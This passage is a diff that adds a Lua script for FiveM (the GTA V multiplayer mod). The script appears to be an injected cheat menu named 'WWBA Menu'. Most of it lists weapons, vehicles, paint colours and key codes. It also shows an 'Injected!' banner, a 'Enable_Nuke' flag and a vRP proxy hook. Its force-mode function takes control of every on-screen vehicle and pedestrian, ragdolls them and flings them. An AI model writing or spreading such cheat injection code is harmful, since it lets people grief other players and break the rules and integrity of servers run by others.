+    {"WEAPON_POOLCUE", "Pool Cue"},
+    {"WEAPON_PIPEWRENCH", "Pipe Wrench"}
+}
+
+local thrownweapons = {
+    {"WEAPON_GRENADE", "Grenade"},
+    {"WEAPON_STICKYBOMB", "Sticky Bomb"},
+    {"WEAPON_PROXMINE", "Proximity Mine"},
+    {"WEAPON_BZGAS", "BZ Gas"},
+    {"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
+    {"WEAPON_MOLOTOV", "Molotov"},
+    {"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
+    {"WEAPON_PETROLCAN", "Fuel Can"},
+    {"WEAPON_SNOWBALL", "Snowball"},
+    {"WEAPON_FLARE", "Flare"},
+    {"WEAPON_BALL", "Baseball"}
+}
+
+local pistolweapons = {
+    {"WEAPON_PISTOL", "Pistol"},
+    {"WEAPON_PISTOL_MK2", "Pistol Mk II"},
+    {"WEAPON_COMBATPISTOL", "Combat Pistol"},
+    {"WEAPON_APPISTOL", "AP Pistol"},
+    {"WEAPON_REVOLVER", "Revolver"},
+    {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
+    {"WEAPON_DOUBLEACTION", "Double Action Revolver"},
+    {"WEAPON_PISTOL50", "Pistol .50"},
+    {"WEAPON_SNSPISTOL", "SNS Pistol"},
+    {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
+    {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
+    {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
+    {"WEAPON_STUNGUN", "Tazer"},
+    {"WEAPON_FLAREGUN", "Flaregun"},
+    {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
+    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
+}
+
+local smgweapons = {
+    {"WEAPON_MICROSMG", "Micro SMG"},
+    {"WEAPON_MINISMG", "Mini SMG"},
+    {"WEAPON_SMG", "SMG"},
+    {"WEAPON_SMG_MK2", "SMG Mk II"},
+    {"WEAPON_ASSAULTSMG", "Assault SMG"},
+    {"WEAPON_COMBATPDW", "Combat PDW"},
+    {"WEAPON_GUSENBERG", "Gunsenberg"},
+    {"WEAPON_MACHINEPISTOL", "Machine Pistol"},
+    {"WEAPON_MG", "MG"},
+    {"WEAPON_COMBATMG", "Combat MG"},
+    {"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
+    {"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
+}
+
+local assaultweapons = {
+    {"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
+    {"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
+    {"WEAPON_CARBINERIFLE", "Carbine Rifle"},
+    {"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
+    {"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
+    {"WEAPON_SPECIALCARBINE", "Special Carbine"},
+    {"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
+    {"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
+    {"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
+    {"WEAPON_COMPACTRIFLE", "Compact Rifle"}
+}
+
+local shotgunweapons = {
+    {"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
+    {"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
+    {"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
+    {"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
+    {"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
+    {"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
+    {"WEAPON_MUSKET", "Musket"},
+    {"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
+    {"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
+}
+
+local sniperweapons = {
+    {"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
+    {"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
+    {"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
+    {"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
+    {"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
+}
+
+local heavyweapons = {
+    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
+    {"WEAPON_RPG", "RPG"},
+    {"WEAPON_MINIGUN", "Minigun"},
+    {"WEAPON_FIREWORK", "Firework Launcher"},
+    {"WEAPON_RAILGUN", "Railgun"},
+    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
+    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
+    {"WEAPON_RAYMINIGUN", "Widowmaker"}
+}
+
+local compacts = {
+    "BLISTA",
+    "BRIOSO",
+    "DILETTANTE",
+    "DILETTANTE2",
+    "ISSI2",
+    "ISSI3",
+    "ISSI4",
+    "ISSI5",
+    "ISSI6",
+    "PANTO",
+    "PRAIRIE",
+    "RHAPSODY"
+}
+
+local sedans = {
+    "ASEA",
+    "ASEA2",
+    "ASTEROPE",
+    "COG55",
+    "COG552",
+    "COGNOSCENTI",
+    "COGNOSCENTI2",
+    "EMPEROR",
+    "EMPEROR2",
+    "EMPEROR3",
+    "FUGITIVE",
+    "GLENDALE",
+    "INGOT",
+    "INTRUDER",
+    "LIMO2",
+    "PREMIER",
+    "PRIMO",
+    "PRIMO2",
+    "REGINA",
+    "ROMERO",
+    "SCHAFTER2",
+    "SCHAFTER5",
+    "SCHAFTER6",
+    "STAFFORD",
+    "STANIER",
+    "STRATUM",
+    "STRETCH",
+    "SUPERD",
+    "SURGE",
+    "TAILGATER",
+    "WARRENER",
+    "WASHINGTON"
+}
+
+local suvs = {
+    "BALLER",
+    "BALLER2",
+    "BALLER3",
+    "BALLER4",
+    "BALLER5",
+    "BALLER6",
+    "BJXL",
+    "CAVALCADE",
+    "CAVALCADE2",
+    "CONTENDER",
+    "DUBSTA",
+    "DUBSTA2",
+    "FQ2",
+    "GRANGER",
+    "GRESLEY",
+    "HABANERO",
+    "HUNTLEY",
+    "LANDSTALKER",
+    "MESA",
+    "MESA2",
+    "PATRIOT",
+    "PATRIOT2",
+    "RADI",
+    "ROCOTO",
+    "SEMINOLE",
+    "SERRANO",
+    "TOROS",
+    "XLS",
+    "XLS2"
+}
+
+local coupes = {
+    "COGCABRIO",
+    "EXEMPLAR",
+    "F620",
+    "FELON",
+    "FELON2",
+    "JACKAL",
+    "ORACLE",
+    "ORACLE2",
+    "SENTINEL",
+    "SENTINEL2",
+    "WINDSOR",
+    "WINDSOR2",
+    "ZION",
+    "ZION2"
+}
+
+local muscle = {
+    "BLADE",
+    "BUCCANEER",
+    "BUCCANEER2",
+    "CHINO",
+    "CHINO2",
+    "CLIQUE",
+    "COQUETTE3",
+    "DEVIANT",
+    "DOMINATOR",
+    "DOMINATOR2",
+    "DOMINATOR3",
+    "DOMINATOR4",
+    "DOMINATOR5",
+    "DOMINATOR6",
+    "DUKES",
+    "DUKES2",
+    "ELLIE",
+    "FACTION",
+    "FACTION2",
+    "FACTION3",
+    "GAUNTLET",
+    "GAUNTLET2",
+    "HERMES",
+    "HOTKNIFE",
+    "HUSTLER",
+    "IMPALER",
+    "IMPALER2",
+    "IMPALER3",
+    "IMPALER4",
+    "IMPERATOR",
+    "IMPERATOR2",
+    "IMPERATOR3",
+    "LURCHER",
+    "MOONBEAM",
+    "MOONBEAM2",
+    "NIGHTSHADE",
+    "PHOENIX",
+    "PICADOR",
+    "RATLOADER",
+    "RATLOADER2",
+    "RUINER",
+    "RUINER2",
+    "RUINER3",
+    "SABREGT",
+    "SABREGT2",
+    "SLAMVAN",
+    "SLAMVAN2",
+    "SLAMVAN3",
+    "SLAMVAN4",
+    "SLAMVAN5",
+    "SLAMVAN6",
+    "STALION",
+    "STALION2",
+    "TAMPA",
+    "TAMPA3",
+    "TULIP",
+    "VAMOS",
+    "VIGERO",
+    "VIRGO",
+    "VIRGO2",
+    "VIRGO3",
+    "VOODOO",
+    "VOODOO2",
+    "YOSEMITE"
+}
+
+local sportsclassics = {
+    "ARDENT",
+    "BTYPE",
+    "BTYPE2",
+    "BTYPE3",
+    "CASCO",
+    "CHEBUREK",
+    "CHEETAH2",
+    "COQUETTE2",
+    "DELUXO",
+    "FAGALOA",
+    "FELTZER3",
+    "GT500",
+    "INFERNUS2",
+    "JB700",
+    "JESTER3",
+    "MAMBA",
+    "MANANA",
+    "MICHELLI",
+    "MONROE",
+    "PEYOTE",
+    "PIGALLE",
+    "RAPIDGT3",
+    "RETINUE",
+    "SAVESTRA",
+    "STINGER",
+    "STINGERGT",
+    "STROMBERG",
+    "SWINGER",
+    "TORERO",
+    "TORNADO",
+    "TORNADO2",
+    "TORNADO3",
+    "TORNADO4",
+    "TORNADO5",
+    "TORNADO6",
+    "TURISMO2",
+    "VISERIS",
+    "Z190",
+    "ZTYPE"
+}
+
+local sports = {
+    "ALPHA",
+    "BANSHEE",
+    "BESTIAGTS",
+    "BLISTA2",
+    "BLISTA3",
+    "BUFFALO",
+    "BUFFALO2",
+    "BUFFALO3",
+    "CARBONIZZARE",
+    "COMET2",
+    "COMET3",
+    "COMET4",
+    "COMET5",
+    "COQUETTE",
+    "ELEGY",
+    "ELEGY2",
+    "FELTZER2",
+    "FLASHGT",
+    "FUROREGT",
+    "FUSILADE",
+    "FUTO",
+    "GB200",
+    "HOTRING",
+    "ITALIGTO",
+    "JESTER",
+    "JESTER2",
+    "KHAMELION",
+    "KURUMA",
+    "KURUMA2",
+    "LYNX",
+    "MASSACRO",
+    "MASSACRO2",
+    "NEON",
+    "NINEF",
+    "NINEF2",
+    "OMNIS",
+    "PARIAH",
+    "PENUMBRA",
+    "RAIDEN",
+    "RAPIDGT",
+    "RAPIDGT2",
+    "RAPTOR",
+    "REVOLTER",
+    "RUSTON",
+    "SCHAFTER2",
+    "SCHAFTER3",
+    "SCHAFTER4",
+    "SCHAFTER5",
+    "SCHLAGEN",
+    "SCHWARZER",
+    "SENTINEL3",
+    "SEVEN70",
+    "SPECTER",
+    "SPECTER2",
+    "SULTAN",
+    "SURANO",
+    "TAMPA2",
+    "TROPOS",
+    "VERLIERER2",
+    "ZR380",
+    "ZR3802",
+    "ZR3803"
+}
+
+local super = {
+    "ADDER",
+    "AUTARCH",
+    "BANSHEE2",
+    "BULLET",
+    "CHEETAH",
+    "CYCLONE",
+    "DEVESTE",
+    "ENTITYXF",
+    "ENTITY2",
+    "FMJ",
+    "GP1",
+    "INFERNUS",
+    "ITALIGTB",
+    "ITALIGTB2",
+    "LE7B",
+    "NERO",
+    "NERO2",
+    "OSIRIS",
+    "PENETRATOR",
+    "PFISTER811",
+    "PROTOTIPO",
+    "REAPER",
+    "SC1",
+    "SCRAMJET",
+    "SHEAVA",
+    "SULTANRS",
+    "T20",
+    "TAIPAN",
+    "TEMPESTA",
+    "TEZERACT",
+    "TURISMOR",
+    "TYRANT",
+    "TYRUS",
+    "VACCA",
+    "VAGNER",
+    "VIGILANTE",
+    "VISIONE",
+    "VOLTIC",
+    "VOLTIC2",
+    "XA21",
+    "ZENTORNO"
+}
+
+local WWBA = {
+    "NEON",
+	"SULTAN",
+	"SULTANRS",
+	"C7",
+	"C8",
+	"NQSRT",
+    "Charger",
+	"CONTGT2011",
+	"CHALLENGER",
+	"C63HR",
+	"reaper",
+	"7rbj",
+	"rmodmustang",
+	"b6mr",
+	"rmode63s",
+	"MUSTANG",
+	"rmodzl1",
+	"SVOLITO2",
+	"DUBSTA",
+	"venom"
+}
+
+local offroad = {
+    "BFINJECTION",
+    "BIFTA",
+    "BLAZER",
+    "BLAZER2",
+    "BLAZER3",
+    "BLAZER4",
+    "BLAZER5",
+    "BODHI2",
+    "BRAWLER",
+    "BRUISER",
+    "BRUISER2",
+    "BRUISER3",
+    "BRUTUS",
+    "BRUTUS2",
+    "BRUTUS3",
+    "CARACARA",
+    "DLOADER",
+    "DUBSTA3",
+    "DUNE",
+    "DUNE2",
+    "DUNE3",
+    "DUNE4",
+    "DUNE5",
+    "FREECRAWLER",
+    "INSURGENT",
+    "INSURGENT2",
+    "INSURGENT3",
+    "KALAHARI",
+    "KAMACHO",
+    "MARSHALL",
+    "MENACER",
+    "MESA3",
+    "MONSTER",
+    "MONSTER3",
+    "MONSTER4",
+    "MONSTER5",
+    "NIGHTSHARK",
+    "RANCHERXL",
+    "RANCHERXL2",
+    "RCBANDITO",
+    "REBEL",
+    "REBEL2",
+    "RIATA",
+    "SANDKING",
+    "SANDKING2",
+    "TECHNICAL",
+    "TECHNICAL2",
+    "TECHNICAL3",
+    "TROPHYTRUCK",
+    "TROPHYTRUCK2"
+}
+
+local industrial = {
+    "BULLDOZER",
+    "CUTTER",
+    "DUMP",
+    "FLATBED",
+    "GUARDIAN",
+    "HANDLER",
+    "MIXER",
+    "MIXER2",
+    "RUBBLE",
+    "TIPTRUCK",
+    "TIPTRUCK2"
+}
+
+local utility = {
+    "AIRTUG",
+    "CADDY",
+    "CADDY2",
+    "CADDY3",
+    "DOCKTUG",
+    "FORKLIFT",
+    "TRACTOR2",
+    "TRACTOR3",
+    "MOWER",
+    "RIPLEY",
+    "SADLER",
+    "SADLER2",
+    "SCRAP",
+    "TOWTRUCK",
+    "TOWTRUCK2",
+    "TRACTOR",
+    "UTILLITRUCK",
+    "UTILLITRUCK2",
+    "UTILLITRUCK3",
+    "ARMYTRAILER",
+    "ARMYTRAILER2",
+    "FREIGHTTRAILER",
+    "ARMYTANKER",
+    "TRAILERLARGE",
+    "DOCKTRAILER",
+    "TR3",
+    "TR2",
+    "TR4",
+    "TRFLAT",
+    "TRAILERS",
+    "TRAILERS4",
+    "TRAILERS2",
+    "TRAILERS3",
+    "TVTRAILER",
+    "TRAILERLOGS",
+    "TANKER",
+    "TANKER2",
+    "BALETRAILER",
+    "GRAINTRAILER",
+    "BOATTRAILER",
+    "RAKETRAILER",
+    "TRAILERSMALL"
+}
+
+local vans = {
+    "BISON",
+    "BISON2",
+    "BISON3",
+    "BOBCATXL",
+    "BOXVILLE",
+    "BOXVILLE2",
+    "BOXVILLE3",
+    "BOXVILLE4",
+    "BOXVILLE5",
+    "BURRITO",
+    "BURRITO2",
+    "BURRITO3",
+    "BURRITO4",
+    "BURRITO5",
+    "CAMPER",
+    "GBURRITO",
+    "GBURRITO2",
+    "JOURNEY",
+    "MINIVAN",
+    "MINIVAN2",
+    "PARADISE",
+    "PONY",
+    "PONY2",
+    "RUMPO",
+    "RUMPO2",
+    "RUMPO3",
+    "SPEEDO",
+    "SPEEDO2",
+    "SPEEDO4",
+    "SURFER",
+    "SURFER2",
+    "TACO",
+    "YOUGA",
+    "YOUGA2"
+}
+
+local cycles = {
+    "BMX",
+    "CRUISER",
+    "FIXTER",
+    "SCORCHER",
+    "TRIBIKE",
+    "TRIBIKE2",
+    "TRIBIKE3"
+}
+
+local boats = {
+    "DINGHY",
+    "DINGHY2",
+    "DINGHY3",
+    "DINGHY4",
+    "JETMAX",
+    "MARQUIS",
+    "PREDATOR",
+    "SEASHARK",
+    "SEASHARK2",
+    "SEASHARK3",
+    "SPEEDER",
+    "SPEEDER2",
+    "SQUALO",
+    "SUBMERSIBLE",
+    "SUBMERSIBLE2",
+    "SUNTRAP",
+    "TORO",
+    "TORO2",
+    "TROPIC",
+    "TROPIC2",
+    "TUG"
+}
+
+local helicopters = {
+    "AKULA",
+    "ANNIHILATOR",
+    "BUZZARD",
+    "BUZZARD2",
+    "CARGOBOB",
+    "CARGOBOB2",
+    "CARGOBOB3",
+    "CARGOBOB4",
+    "FROGGER",
+    "FROGGER2",
+    "HAVOK",
+    "HUNTER",
+    "MAVERICK",
+    "POLMAV",
+    "SAVAGE",
+    "SEASPARROW",
+    "SKYLIFT",
+    "SUPERVOLITO",
+    "SUPERVOLITO2",
+    "SWIFT",
+    "SWIFT2",
+    "VALKYRIE",
+    "VALKYRIE2",
+    "VOLATUS"
+}
+
+local planes = {
+    "ALPHAZ1",
+    "AVENGER",
+    "AVENGER2",
+    "BESRA",
+    "BLIMP",
+    "BLIMP2",
+    "BLIMP3",
+    "BOMBUSHKA",
+    "CARGOPLANE",
+    "CUBAN800",
+    "DODO",
+    "DUSTER",
+    "HOWARD",
+    "HYDRA",
+    "JET",
+    "LAZER",
+    "LUXOR",
+    "LUXOR2",
+    "MAMMATUS",
+    "MICROLIGHT",
+    "MILJET",
+    "MOGUL",
+    "MOLOTOK",
+    "NIMBUS",
+    "NOKOTA",
+    "PYRO",
+    "ROGUE",
+    "SEABREEZE",
+    "SHAMAL",
+    "STARLING",
+    "STRIKEFORCE",
+    "STUNT",
+    "TITAN",
+    "TULA",
+    "VELUM",
+    "VELUM2",
+    "VESTRA",
+    "VOLATOL"
+}
+
+local service = {
+    "AIRBUS",
+    "BRICKADE",
+    "BUS",
+    "COACH",
+    "PBUS2",
+    "RALLYTRUCK",
+    "RENTALBUS",
+    "TAXI",
+    "TOURBUS",
+    "TRASH",
+    "TRASH2",
+    "WASTELANDER",
+    "AMBULANCE",
+    "FBI",
+    "FBI2",
+    "FIRETRUK",
+    "LGUARD",
+    "PBUS",
+    "POLICE",
+    "POLICE2",
+    "POLICE3",
+    "POLICE4",
+    "POLICEB",
+    "POLICEOLD1",
+    "POLICEOLD2",
+    "POLICET",
+    "POLMAV",
+    "PRANGER",
+    "PREDATOR",
+    "RIOT",
+    "RIOT2",
+    "SHERIFF",
+    "SHERIFF2",
+    "APC",
+    "BARRACKS",
+    "BARRACKS2",
+    "BARRACKS3",
+    "BARRAGE",
+    "CHERNOBOG",
+    "CRUSADER",
+    "HALFTRACK",
+    "KHANJALI",
+    "RHINO",
+    "SCARAB",
+    "SCARAB2",
+    "SCARAB3",
+    "THRUSTER",
+    "TRAILERSMALL2"
+}
+
+local commercial = {
+    "BENSON",
+    "BIFF",
+    "CERBERUS",
+    "CERBERUS2",
+    "CERBERUS3",
+    "HAULER",
+    "HAULER2",
+    "MULE",
+    "MULE2",
+    "MULE3",
+    "MULE4",
+    "PACKER",
+    "PHANTOM",
+    "PHANTOM2",
+    "PHANTOM3",
+    "POUNDER",
+    "POUNDER2",
+    "STOCKADE",
+    "STOCKADE3",
+    "TERBYTE",
+    "CABLECAR",
+    "FREIGHT",
+    "FREIGHTCAR",
+    "FREIGHTCONT1",
+    "FREIGHTCONT2",
+    "FREIGHTGRAIN",
+    "METROTRAIN",
+    "TANKERCAR"
+}
+
+-- END VEHICLES LISTS
+-- VEHICLE MODS LIST (this is going to take a while...)
+local classicColors = {
+    {"Black", 0},
+    {"Carbon Black", 147},
+    {"Graphite", 1},
+    {"Anhracite Black", 11},
+    {"Black Steel", 2},
+    {"Dark Steel", 3},
+    {"Silver", 4},
+    {"Bluish Silver", 5},
+    {"Rolled Steel", 6},
+    {"Shadow Silver", 7},
+    {"Stone Silver", 8},
+    {"Midnight Silver", 9},
+    {"Cast Iron Silver", 10},
+    {"Red", 27},
+    {"Torino Red", 28},
+    {"Formula Red", 29},
+    {"Lava Red", 150},
+    {"Blaze Red", 30},
+    {"Grace Red", 31},
+    {"Garnet Red", 32},
+    {"Sunset Red", 33},
+    {"Cabernet Red", 34},
+    {"Wine Red", 143},
+    {"Candy Red", 35},
+    {"Hot Pink", 135},
+    {"Pfsiter Pink", 137},
+    {"Salmon Pink", 136},
+    {"Sunrise Orange", 36},
+    {"Orange", 38},
+    {"Bright Orange", 138},
+    {"Gold", 99},
+    {"Bronze", 90},
+    {"Yellow", 88},
+    {"Race Yellow", 89},
+    {"Dew Yellow", 91},
+    {"Dark Green", 49},
+    {"Racing Green", 50},
+    {"Sea Green", 51},
+    {"Olive Green", 52},
+    {"Bright Green", 53},
+    {"Gasoline Green", 54},
+    {"Lime Green", 92},
+    {"Midnight Blue", 141},
+    {"Galaxy Blue", 61},
+    {"Dark Blue", 62},
+    {"Saxon Blue", 63},
+    {"Blue", 64},
+    {"Mariner Blue", 65},
+    {"Harbor Blue", 66},
+    {"Diamond Blue", 67},
+    {"Surf Blue", 68},
+    {"Nautical Blue", 69},
+    {"Racing Blue", 73},
+    {"Ultra Blue", 70},
+    {"Light Blue", 74},
+    {"Chocolate Brown", 96},
+    {"Bison Brown", 101},
+    {"Creeen Brown", 95},
+    {"Feltzer Brown", 94},
+    {"Maple Brown", 97},
+    {"Beechwood Brown", 103},
+    {"Sienna Brown", 104},
+    {"Saddle Brown", 98},
+    {"Moss Brown", 100},
+    {"Woodbeech Brown", 102},
+    {"Straw Brown", 99},
+    {"Sandy Brown", 105},
+    {"Bleached Brown", 106},
+    {"Schafter Purple", 71},
+    {"Spinnaker Purple", 72},
+    {"Midnight Purple", 142},
+    {"Bright Purple", 145},
+    {"Cream", 107},
+    {"Ice White", 111},
+    {"Frost White", 112}
+}
+
+local matteColors = {
+    {"Black", 12},
+    {"Gray", 13},
+    {"Light Gray", 14},
+    {"Ice White", 131},
+    {"Blue", 83},
+    {"Dark Blue", 82},
+    {"Midnight Blue", 84},
+    {"Midnight Purple", 149},
+    {"Schafter Purple", 148},
+    {"Red", 39},
+    {"Dark Red", 40},
+    {"Orange", 41},
+    {"Yellow", 42},
+    {"Lime Green", 55},
+    {"Green", 128},
+    {"Forest Green", 151},
+    {"Foliage Green", 155},
+    {"Olive Darb", 152},
+    {"Dark Earth", 153},
+    {"Desert Tan", 154}
+}
+
+local metalColors = {
+    {"Brushed Steel", 117},
+    {"Brushed Black Steel", 118},
+    {"Brushed Aluminum", 119},
+    {"Chrome", 120},
+    {"Pure Gold", 158},
+    {"Brushed Gold", 159}
+}
+
+
+local Keys = {
+    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, ["F11"] = 344, 
+    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
+    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
+    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
+    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
+    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
+    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
+    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
+    ["NENTER"] = 201, ["N4"] = 124, ["N5"] = 126, ["N6"] = 125, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
+    ["MOUSE1"] = 24
+}
+local Enable_Nuke = false
+local currentMenuX = 1
+local selectedMenuX = 1
+local currentMenuY = 1
+local selectedMenuY = 1
+local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
+local menuY = { 0.1, 0.025, 0.2, 0.3 , 0.400, 0.425 }
+
+
+local introInteger = 0
+
+function InitializeIntro(scaleform, message, messagesmall)
+    local scaleform = RequestScaleformMovie(scaleform)
+    while not HasScaleformMovieLoaded(scaleform) do
+        Citizen.Wait(1)
+    end
+    PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
+    PushScaleformMovieFunctionParameterString(message)
+    PushScaleformMovieFunctionParameterString(messagesmall)
+    PopScaleformMovieFunctionVoid()
+    PushScaleformMovieMethodParameterInt(5)
+    return scaleform
+end
+
+if introInteger == 0 then
+			Citizen.CreateThread(function()
+			while introInteger < 300 do
+			Citizen.Wait(2)
+			introScaleform = InitializeIntro("mp_big_message_freemode", "~r~! W W B A Menu ~v~| ~g~Injected!", "Open With ~r~L ~g~or ~r~F10")
+            DrawScaleformMovieFullscreen(introScaleform, 80, 80, 80, 255)
+            introInteger = introInteger + 1
+		end
+	end)
+end
+
+vRP = Proxy.getInterface("vRP")
+
+
+local function ForceMod()
+    ForceTog = not ForceTog
+    
+    if ForceTog then
+        
+        Citizen.CreateThread(function()
+            ShowInfo("Force Mode ~g~[ON] ~g~\n~s~Active Mode ---> KEY ~y~[E] ")
+            
+            local ForceKey = Keys["E"]
+            local Force = 0.5
+            local KeyPressed = false
+            local KeyTimer = 0
+            local KeyDelay = 15
+            local ForceEnabled = false
+            local StartPush = false
+            
+            function forcetick()
+                
+                if (KeyPressed) then
+                    KeyTimer = KeyTimer + 1
+                    if (KeyTimer >= KeyDelay) then
+                        KeyTimer = 0
+                        KeyPressed = false
+                    end
+                end
+                
+                
+                
+                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
+                    KeyPressed = true
+                    ForceEnabled = true
+                end
+                
+                if (StartPush) then
+                    
+                    StartPush = false
+                    local pid = PlayerPedId()
+                    local CamRot = GetGameplayCamRot(2)
+                    
+                    local force = 5
+                    
+                    local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
+                    local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
+                    local Fz = force * (CamRot.x * 0.2)
+                    
+                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
+                    
+                    for k in EnumerateVehicles() do
+                        SetEntityInvincible(k, false)
+                        if IsEntityOnScreen(k) and k ~= PlayerVeh then
+                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
+                        end
+                    end
+                    
+                    for k in EnumeratePeds() do
+                        if IsEntityOnScreen(k) and k ~= pid then
+                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
+                        end
+                    end
+                
+                end
+                
+                
+                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
+                    KeyPressed = true
+                    StartPush = true
+                    ForceEnabled = false
+                end
+                
+                if (ForceEnabled) then
+                    local pid = PlayerPedId()
+                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
+                    
+                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
+                    
+                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 180, 0, 0, 35, false, true, 2, nil, nil, false)
+                    
+                    for k in EnumerateVehicles() do
+                        SetEntityInvincible(k, true)
+                        if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
+                            RequestControlOnce(k)
+                            FreezeEntityPosition(k, false)
+                            Oscillate(k, Markerloc, 0.5, 0.3)
+                        end
+                    end
+                    
+                    for k in EnumeratePeds() do
+                        if IsEntityOnScreen(k) and k ~= PlayerPedId() then
+                            RequestControlOnce(k)
+                            SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
+                            FreezeEntityPosition(k, false)
+                            Oscillate(k, Markerloc, 0.5, 0.3)
+                        end
+                    end
+                
+                end
+            
+            end
+            
+            while ForceTog do forcetick()Wait(0) end
+        end)
+    else ShowInfo("Force Mode ~r~[OFF]") end
+
+end
+
+function GetSeatPedIsIn(ped)
+    if not IsPedInAnyVehicle(ped, false) then return
+    else
+        veh = GetVehiclePedIsIn(ped)
+        for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
+            if GetPedInVehicleSeat(veh) then return i end
+        end
+    end
+end
+
+function GetCamDirFromScreenCenter()
+    local pos = GetGameplayCamCoord()
+    local world = ScreenToWorld(0, 0)
+    local ret = SubVectors(world, pos)
+    return ret
+end
+
+local function RGBRainbow(frequency)
+	local result = {}
+	local curtime = GetGameTimer() / 1000
+
+	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
+	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
+	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
+
+	return result
+end
+
+function ScreenToWorld(screenCoord)
+    local camRot = GetGameplayCamRot(2)
+    local camPos = GetGameplayCamCoord()
+    
+    local vect2x = 0.0
+    local vect2y = 0.0
+    local vect21y = 0.0
+    local vect21x = 0.0
+    local direction = RotationToDirection(camRot)
+    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
+    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
+    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
+    
+    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
+    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
+    local radians = -(math.rad(camRot.y))
+    
+    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
+    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
+    
+    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
+    if not case1 then
+        vect2x = x1
+        vect2y = y1
+        return camPos + (direction * 10.0)
+    end
+    
+    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
+    if not case2 then
+        vect21x = x2
+        vect21y = y2
+        return camPos + (direction * 10.0)
+    end
+    
+    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
